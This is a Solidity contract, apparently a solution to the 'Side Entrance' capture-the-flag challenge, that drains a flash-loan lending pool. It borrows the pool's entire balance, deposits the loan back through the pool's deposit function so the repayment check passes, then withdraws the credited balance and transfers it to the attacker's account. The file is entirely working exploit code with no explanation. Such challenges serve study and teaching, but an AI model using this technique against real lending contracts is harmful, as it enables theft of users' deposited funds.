pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttacker {
    using SafeMath for uint256;

    ISideEntranceLenderPool _pool;
    uint256 _poolBalance;
    address payable _attackerEOA;

    constructor() public {}

    function attack(ISideEntranceLenderPool pool, address payable attackerEOA)
        public
    {
        _pool = pool;
        _attackerEOA = attackerEOA;
        _poolBalance = address(_pool).balance;

        // calls execute, then checks pool balance
        _pool.flashLoan(_poolBalance);

        _pool.withdraw();
        _attackerEOA.transfer(_poolBalance);
    }

    // called by ISideEntranceLenderPool::flashLoan
    function execute() external payable {
        _pool.deposit{value: _poolBalance}();
    }

    // needed for pool.withdraw() to work
    receive() external payable {}
}
